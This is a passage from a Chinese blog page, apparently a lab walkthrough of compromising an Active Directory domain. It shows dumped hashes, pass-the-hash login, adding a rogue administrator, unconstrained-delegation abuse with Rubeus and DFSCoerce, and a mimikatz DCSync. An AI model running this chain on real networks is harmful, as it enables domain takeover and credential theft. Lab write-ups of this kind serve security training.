16</span><br><span class="line">                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a</span><br><span class="line">                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6</span><br><span class="line">                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d</span><br><span class="line">                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d</span><br><span class="line">                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5</span><br><span class="line">                        c 57 a8</span><br><span class="line">WIN19$    xiaorang.lab  3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d</span><br><span class="line">                         90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 5</span><br><span class="line">                        9 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 84 35 8a 0c 2e 9f d1 90</span><br><span class="line">                        0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d df 3f 33 f5 16 e4 ee 2e</span><br><span class="line">                         d3 88 92 cd a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 5</span><br><span class="line">                        3 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1 0e 6b 64 a7 fc 7a 2a a5 0e e0 b0 66 a9 a0 2f</span><br><span class="line">                        8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 cd a0 cc 5b f4 0e</span><br><span class="line">                         a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e</span><br><span class="line">                        1 d0 1f</span><br><span class="line">win19$    XIAORANG.LAB  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25</span><br><span class="line">                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4</span><br><span class="line">                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16</span><br><span class="line">                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a</span><br><span class="line">                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6</span><br><span class="line">                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d</span><br><span class="line">                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d</span><br><span class="line">                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5</span><br><span class="line">                        c 57 a8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>hashdump</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br><span class="line">Adrian:1003:aad3b435b51404eeaad3b435b51404ee:4ba5d16eb261eb61148ab5264f457cbb:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::</span><br></pre></td></tr></table></figure>

<p>用Administrator登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45</span><br><span class="line">C:\&gt;type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>

<h1 id="FLAG3-amp-FLAG4"><a href="#FLAG3-amp-FLAG4" class="headerlink" title="FLAG3&amp;FLAG4"></a>FLAG3&amp;FLAG4</h1><p>添加一个新用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user lv Asd123132 /add</span><br><span class="line">net localgroup administrators lv /add</span><br></pre></td></tr></table></figure>

<p>查看域内委派关系</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lv\Desktop&gt;Adinfo_win.exe -d=&quot;xiaorang.lab&quot; --dc=&quot;172.22.4.7&quot; -u=&quot;WIN19$&quot; -H=&quot;d41fef724adf6f2ed2cbb5a4ebd186c9&quot;</span><br><span class="line"></span><br><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | &#x27;_ \|  _/ _ \     Tools that collect information from domain</span><br><span class="line">  / ____ \| |__| | | | | | || (_) |</span><br><span class="line"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span><br><span class="line"></span><br><span class="line">[i] Try to connect &#x27;172.22.4.7&#x27;</span><br><span class="line">[c] Auth Domain: xiaorang.lab</span><br><span class="line">[c] Auth user: WIN19$</span><br><span class="line">[c] Auth hash: d41fef724adf6f2ed2cbb5a4ebd186c9</span><br><span class="line">[c] connected successfully,try to dump domain info</span><br><span class="line">[i] DomainVersion found!</span><br><span class="line">                    [+] Windows 2016 Server operating system</span><br><span class="line">[i] Domain SID:</span><br><span class="line">                    [+] S-1-5-21-1913786442-1328635469-1954894845</span><br><span class="line">[i] Domain MAQ found</span><br><span class="line">                    [+] 10</span><br><span class="line">[i] Domain Account Policy found</span><br><span class="line">                    [+] pwdHistory: 24</span><br><span class="line">                    [+] minPwdLength: 7</span><br><span class="line">                    [+] minPwdAge: 1(day)</span><br><span class="line">                    [+] maxPwdAge: 42(day)</span><br><span class="line">                    [+] lockoutThreshold: 0</span><br><span class="line">                    [+] lockoutDuration: 30(min)</span><br><span class="line">[i] Domain Controllers: 1 found</span><br><span class="line">                    [+] DC01$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.4.7</span><br><span class="line">[i] ADCS has not found!</span><br><span class="line">[i] Domain Exchange Server: 0 found</span><br><span class="line">[i] Domain All DNS:</span><br><span class="line">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br><span class="line">[i] Domain Trusts: 0 found</span><br><span class="line">[i] SPN: 39 found</span><br><span class="line">[i] Domain GPOs: 2 found</span><br><span class="line">[i] Domain Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Enterprise Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] administrators: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Backup Operators: 0 users found</span><br><span class="line">[i] Users: 6 found</span><br><span class="line">[i] User with Mail: 0 found</span><br><span class="line">[i] Only_name_and_Useful_Users: 3 found</span><br><span class="line">[i] Only_admincount=1_andUseful_Users: 1 found</span><br><span class="line">[i] Locked Users: 0 found</span><br><span class="line">[i] Disabled Users: 3 found</span><br><span class="line">[i] Users with passwords not set to expire: 2 found</span><br><span class="line">[i] Domain Computers: 5 found</span><br><span class="line">[i] Only_name_and_Useful_computers: 5 found</span><br><span class="line">[i] Groups: 49 found</span><br><span class="line">[i] Domain OUs: 1 found</span><br><span class="line">[i] LAPS Not found</span><br><span class="line">[i] LAPS passwords: 0 found</span><br><span class="line">[i] SensitiveDelegate Users: 0 found</span><br><span class="line">[i] AsReproast Users: 0 found</span><br><span class="line">[i] Kerberoast Users: 1 found</span><br><span class="line">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw</span><br><span class="line">[i] SIDHistory Users: 0 found</span><br><span class="line">[i] CreatorSID Users: 2 found</span><br><span class="line">                    [+] WIN-3X7U15C2XDM$  ==&gt;&gt;&gt;  Marcus</span><br><span class="line">                    [+] WIN-YUUAW2QG9MF$  ==&gt;&gt;&gt;  Marcus</span><br><span class="line">[i] RBCD Users: 0 found</span><br><span class="line">[i] Unconstrained Deligation Users: 1 found</span><br><span class="line">                    [+] WIN19$</span><br><span class="line">[i] Constrained Deligation Users: 0 found</span><br><span class="line">[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST</span><br><span class="line">[i] CSVs written to &#x27;csv&#x27; directory in C:\Users\lv\Desktop</span><br><span class="line">[i] Execution took 1.0246743s</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[i] Unconstrained Deligation Users: 1 found</span><br><span class="line">                    [+] WIN19$</span><br></pre></td></tr></table></figure>

<p>WIN19$有非约束委派，上传Rubeus进行监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lv\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line">[*] Action: TGT Monitoring</span><br><span class="line">[*] Target user     : DC01$</span><br><span class="line">[*] Monitoring every 1 seconds for new TGTs</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后使用dfscoerce让DS向WIN19$认证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# proxy -f proxychains4.conf -q python3 ../script/AD/dfscoerce.py -u &quot;WIN19$&quot; -hashes :d41fef724adf6f2ed2cbb5a4ebd186c9 -d xiaorang.lab WIN19 172.22.4.7</span><br><span class="line">[-] Connecting to ncacn_np:172.22.4.7[\PIPE\netdfs]</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending NetrDfsRemoveStdRoot!</span><br><span class="line">NetrDfsRemoveStdRoot</span><br><span class="line">ServerName:                      &#x27;WIN19\x00&#x27;</span><br><span class="line">RootShare:                       &#x27;test\x00&#x27;</span><br><span class="line">ApiFlags:                        1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lvv\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.2.0</span><br><span class="line"></span><br><span class="line">[*] Action: TGT Monitoring</span><br><span class="line">[*] Target user     : DC01$</span><br><span class="line">[*] Monitoring every 1 seconds for new TGTs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] 2025/4/18 4:54:32 UTC - Found new TGT:</span><br><span class="line"></span><br><span class="line">  User                  :  DC01$@XIAORANG.LAB</span><br><span class="line">  StartTime             :  2025/4/18 10:28:04</span><br><span class="line">  EndTime               :  2025/4/18 20:28:04</span><br><span class="line">  RenewTill             :  2025/4/25 10:28:04</span><br><span class="line">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable</span><br><span class="line">  Base64EncodedTicket   :</span><br><span class="line"></span><br><span class="line">    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRn</span><br><span class="line">    dBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6F05kURrtAGLPwnEu0x0RxvAPS3m5aRx/bjVuGQLR7b0+L</span><br><span class="line">    x5X557jubFee2VfyECSf1RICTWkdJttbkCj4s6IMQrVpe8jFgy3Uki4NC0WdUfzH1nIiJSCq0lRPzgI88NGOrQEbDaurBzq150lY</span><br><span class="line">    i68ssuARb6DWCu6HYLjq66NSI53LNGAHqlNVoU+83ZOhJboPDjY2XL74OXFh0Qr57fWAbUOWegzVPHFicFshmeiMv111lfJr0X6Q</span><br><span class="line">    aqATuWtvoSsDI+/v3HyGMlqmlqJmmt0coW9z0L6V52yL7XA2YfXod7N+hWb/gclV5+C1G7GNj/uM3Zi5DyJ9kk+IuWHKWRRrz7JR</span><br><span class="line">    iPDy9zMJWBDgeMsEEmB/uh492tq+i3g8o49PocQ2TqcnRBPCiAEbpWhpz/LDb6P6f+ySqupcTcM5q9G+6CT6Rj/aMDAjqZEsRpfb</span><br><span class="line">    agn3XEjKWbF+kpAuuvr+eGd0xICbySdM21JRTjqZmZmUPkEe5Y0zKH+wVUUVJOAv8BVeKirxdKtYyDYiudFtUUGGkIzt2Z3J1yJY</span><br><span class="line">    GA8B90UklsraI8O6Q83i2nE11WkcxEXceYh7PBoeL6ivncb8UqZK2Nh07+1QlILNCx+5WFFLjNSoBLhofg3TIsPCr2zFNXTNbBPv</span><br><span class="line">    zP+bjqJawf7BY0KUWNLvgAltKMXX1T9pzNREspsKwRMjXZgsyTbil3reoEciEexNtXVhWxrk+xbp9DIL/74f4rafpIMsi7myoH6a</span><br><span class="line">    u1kjVexmmP4wOWp7KGvMm1gNp+XeakyHPiFlqIt4V0b4KGfd9Zd3rtQI3gtM7oeUm6PDlEn9vK0MVBpZZJeW6IDkZdXC7SBmPM1z</span><br><span class="line">    p0uno3wGRj0MuqqnPaV8XRJR0sEaNGD8HABfQkdCMHm5GQ8w71AIEy9i2otNPegf6P0j4EPsNwtyo2o97GKu/y27tvKv1FH43S4G</span><br><span class="line">    ij5gjiKBxIn2JtQ9oPvb0v+2SZWU08xE6v+b79PsWvr5STsl4eUJHnTuXizQfsY597gQAVgKD7vKeIXEsgb11VVP9HCtUjxCmBNS</span><br><span class="line">    25QzZvXbuWkEJ6k/7AYu0qvT3auHC1cbf4MmuMrc/DlT4MphkuUF5j8hfSEgEAVWhVZVuPZA3v6C+O8PYmDl1d9lT6JjZ5wuQrAG</span><br><span class="line">    Dwt7+cZ9wzuWLDUkB1dtiTm0cuFLXAmOLLDjpSWxIXK2B9TNAagAq2slNrb775ovLLdo/swtuRAKazjqgCAygra59RWoqP+loVv8</span><br><span class="line">    nxii1cB/M4tFLpGuZlTdOnyME8JT8D40++QW5IxMPffywi5tpjhDUnVC1wtK49BOaljvJKH8LcWHWyALrv2j8De6HPabKhCcnDiY</span><br><span class="line">    /w7QHVbcAh/Jo64uH2aYRSQEz5j7oGpAAP3ENCvzEaV8e/53wwRqjyife177PX7j9/ZfoqzfiRnr1kjeHIZsGw5zYyTmLbB/91Np</span><br><span class="line">    RN2jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCClV6tyB9NAYvRnxe9wuyHOhysxVh63TouQkdqL</span><br><span class="line">    8MLxbKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxODAyMjgwNFqmERgPMjAy</span><br><span class="line">    NTA0MTgxMjI4MDRapxEYDzIwMjUwNDI1MDIyODA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9S</span><br><span class="line">    QU5HLkxBQg==</span><br><span class="line"></span><br><span class="line">[*] Ticket cache size: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>导入 TGT 然后 DCSync</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6rh73GDFsxBznVrGsdmcNb9fO1z8fVnV/kQUwXHY0vvUHSorZebamFLkiZi+LEkih3n4TJMOlCI8vlnlS5lPlr03uPc5nd6Pw7PWoVw7m2UH/TmMy4nuBKVVbKEIImNbFyhTleg75qJ+5D224ws/fpRGtQyH0WPmyMbevlI+xTTOLJGe9+YScZMva/hvc2nPq09ZNNzIMo8erEYpJCv1VucuzcoUrJFGTtASWqa0Aaeza+mypwP7OGmc2qnQEMu8l1XIEqe7JYdY934vsm37k8KarPLFlzyOhbzDW4t/GjlZ1aHXSLj332T90BxfZKoSe7tnA8cldicFQ8LmGBWBKeKms6sc8K4KQVGMdhyjno5L5jeKqtL49oc+a44kyJYlGjXnKpep5seUp3+2TXXvmF9/HnHSG+M6QQpepWGdfk6diRhgDvZyq1AX6GggRsXfIEpE721UcTowO2HQOfsv+W++pTiAoEvrkU6ciJ3VI3EZFelGkq3hfZ3MQydIdBCPVeaDwE1fcp05wGuDmuFDhf+C1nelwaTqYJIZScVgR+7o4FcGpStyycsbBMfzdasL70KSV3se6ZlvY24/Binnb3YOHMpWkpLRjUovQ7ep2fCN0f6Pt/P8JTCVC0oCFIy05otlw3n8nd4NctrNBWQBevIiuAobMrJ1Ww5UbSQHrCF6hTV6NTbL1irI3wR10rwNkaxWpspvcL5/HOTzXXRtq619o0lTdpz60KSroci5nuj4WfPtQ6ESiU8c4P9Y/exWUmhOGN10Wg1t4j4k+agTrvK2dy2ybLn1FNkqWMfMr3vcUm8BU7ESstKZp47FG1pkaQl6/bjGwElN0BhycbT8L1yxIj+rFspX3d6olXwiMIaF50EV5DM1V3oH/OJu5sHbIFqrGkRqooDTfrHyF8c1AnruzDtD2lxipt043llvOURkRj8Qd/qIiRZBqnYo4RD95J9J8Jbim35hFzbuV5PMS5Ekw9oRfzsGCD5VeKBb9i02mJTvWUqJjZi/YWI9wKaeKKCTKHYKKSmDfkJlF4gLUp12XwuTe4zEwhXUgBYEC7N7EA6u0/9dxwL5AWaRtOqL05rgFu2Ix2+wfBu1n4ToxGmYke44n6JSSXCqKW2KPkznAU0QPvhcYwjZsOFo4R/bVe9qQAcHBLwQ+9fq8DZBnRStKlgmIMeJXCPAPv5da69p2BnR4Bq+X71X5pWB4C0xHZtmxZ71ahe+cZYmDaap8SEvI7BDTkKaDDnvp3cLSVvX5k5uGrjq06yKqpYjlcfai1Yy8GXlecqf2xQ8b6RjkdPkHKVLQZdGZdZMc77Bj5IXwlGvwSQK5PMxo4z1zceza8WQ7WM/iIVwwDAEklXK9bW3pjfHCX9sB5YxAUA/BbJMxuSc1Q2yMpc8CrRNoNNPY184wjlPMAE0wLtAkkiJJlmhkupOA7ZpdlAwvYPEujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCkn5s0Ub8lLXnRynzBbuyWO7uYW7F68Wp1NYL+h5IWoqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxMDA1Mjg0N1qmERgPMjAyNTAyMTAxNTI4NDdapxEYDzIwMjUwMjE3MDUyODQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /all /csv&quot;</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  767e06b9c74fd628dd13785006a9092b        514</span><br><span class="line">1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512</span><br><span class="line">1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512</span><br><span class="line">1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096</span><br><span class="line">1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096</span><br><span class="line">1000    DC01$   23414273a692373e6e076d5fdbb2c213        532480</span><br><span class="line">500     Administrator   4889f6553239ace1f7c47fa2c619c252        512</span><br><span class="line">1103    FILESERVER$     dd213f63df5b16b2daa567705ca88ac7        4096</span><br><span class="line">1104    WIN19$  b6547b5e9c27c42b5cb096f1c922bc3a        528384</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以拿到域控的哈希</p>
<p>然后登录即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\flag&gt; type flag04.txt</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/17/Hackmyvm-system/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/17/Hackmyvm-system/" class="post-title-link" itemprop="url">HackmyVM-system</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-17 15:21:48" itemprop="dateCreated datePublished" datetime="2025-04-17T15:21:48+08:00">2025-04-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-18 17:01:37" itemprop="dateModified" datetime="2025-04-18T17:01:37+08:00">2025-04-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l</p>
